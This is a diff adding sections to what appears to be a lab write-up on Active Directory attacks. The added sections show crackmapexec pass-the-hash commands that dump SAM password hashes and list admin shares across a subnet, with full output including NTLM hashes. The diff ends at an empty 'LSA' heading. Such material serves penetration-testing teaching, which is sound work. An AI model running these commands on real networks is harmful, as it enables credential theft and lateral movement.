@@ -57,7 +57,61 @@ SMB         192.168.23.130  445    HYDRA-DC         [-] HYDRA-DC\administrator:7
 SMB         192.168.23.132  445    SPIDERMAN        [+] SPIDERMAN\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
 ```
 
-We see that we are successful in compromising the local administrator of the same two machines. This is a common scenario that can be seen in an enterprise network as well. 
+We see that we are successful in **compromising the local administrator** of the same two machines. This is a common scenario that can be seen in an enterprise network as well. 
 
 The common thing to do when creating a network is for the SysAdmin to *use the same local administrator password in every single machine* in the network. Even this is a really strong password it does not matter since we do not need to crack is. Just passing it around works.
+
+### SAM Dump
+
+In addition to just logging in, we can dump the SAM using `crackmapexec` as well by specifying the `--sam` flag. In addition to dumping them, these will be **stored in a database** well.
+
+```bash
+$ crackmapexec smb 192.168.23.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --sam    
+SMB         192.168.23.131  445    THEPUNISHER      [*] Windows 10 / Server 2019 Build 19041 x64 (name:THEPUNISHER) (domain:THEPUNISHER) (signing:False) (SMBv1:False)
+SMB         192.168.23.130  445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:HYDRA-DC) (signing:True) (SMBv1:False)
+SMB         192.168.23.132  445    SPIDERMAN        [*] Windows 10 / Server 2019 Build 19041 x64 (name:SPIDERMAN) (domain:SPIDERMAN) (signing:False) (SMBv1:False)
+SMB         192.168.23.131  445    THEPUNISHER      [+] THEPUNISHER\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
+SMB         192.168.23.130  445    HYDRA-DC         [-] HYDRA-DC\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_LOGON_FAILURE 
+SMB         192.168.23.132  445    SPIDERMAN        [+] SPIDERMAN\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
+SMB         192.168.23.131  445    THEPUNISHER      [+] Dumping SAM hashes
+SMB         192.168.23.132  445    SPIDERMAN        [+] Dumping SAM hashes
+SMB         192.168.23.131  445    THEPUNISHER      Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
+SMB         192.168.23.132  445    SPIDERMAN        Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
+SMB         192.168.23.131  445    THEPUNISHER      Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         192.168.23.132  445    SPIDERMAN        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         192.168.23.132  445    SPIDERMAN        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         192.168.23.131  445    THEPUNISHER      DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         192.168.23.131  445    THEPUNISHER      WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:b3add03b24d1f29c29382523ce27a652:::
+SMB         192.168.23.132  445    SPIDERMAN        WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:06305620589538b1768e3850f55048d9:::
+SMB         192.168.23.131  445    THEPUNISHER      frankcastle:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+SMB         192.168.23.131  445    THEPUNISHER      [+] Added 5 SAM hashes to the database
+SMB         192.168.23.132  445    SPIDERMAN        peterparker:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+SMB         192.168.23.132  445    SPIDERMAN        [+] Added 5 SAM hashes to the database
+```
+
+### Listing Shares
+
+```bash
+$ crackmapexec smb 192.168.23.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --shares
+SMB         192.168.23.130  445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:HYDRA-DC) (signing:True) (SMBv1:False)
+SMB         192.168.23.131  445    THEPUNISHER      [*] Windows 10 / Server 2019 Build 19041 x64 (name:THEPUNISHER) (domain:THEPUNISHER) (signing:False) (SMBv1:False)
+SMB         192.168.23.130  445    HYDRA-DC         [-] HYDRA-DC\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_LOGON_FAILURE 
+SMB         192.168.23.132  445    SPIDERMAN        [*] Windows 10 / Server 2019 Build 19041 x64 (name:SPIDERMAN) (domain:SPIDERMAN) (signing:False) (SMBv1:False)
+SMB         192.168.23.131  445    THEPUNISHER      [+] THEPUNISHER\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
+SMB         192.168.23.132  445    SPIDERMAN        [+] SPIDERMAN\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
+SMB         192.168.23.131  445    THEPUNISHER      [+] Enumerated shares
+SMB         192.168.23.131  445    THEPUNISHER      Share           Permissions     Remark
+SMB         192.168.23.131  445    THEPUNISHER      -----           -----------     ------
+SMB         192.168.23.131  445    THEPUNISHER      ADMIN$          READ,WRITE      Remote Admin
+SMB         192.168.23.131  445    THEPUNISHER      C$              READ,WRITE      Default share
+SMB         192.168.23.131  445    THEPUNISHER      IPC$            READ            Remote IPC
+SMB         192.168.23.132  445    SPIDERMAN        [+] Enumerated shares
+SMB         192.168.23.132  445    SPIDERMAN        Share           Permissions     Remark
+SMB         192.168.23.132  445    SPIDERMAN        -----           -----------     ------
+SMB         192.168.23.132  445    SPIDERMAN        ADMIN$          READ,WRITE      Remote Admin
+SMB         192.168.23.132  445    SPIDERMAN        C$              READ,WRITE      Default share
+SMB         192.168.23.132  445    SPIDERMAN        IPC$            READ            Remote IPC
+```
+
+### LSA
 
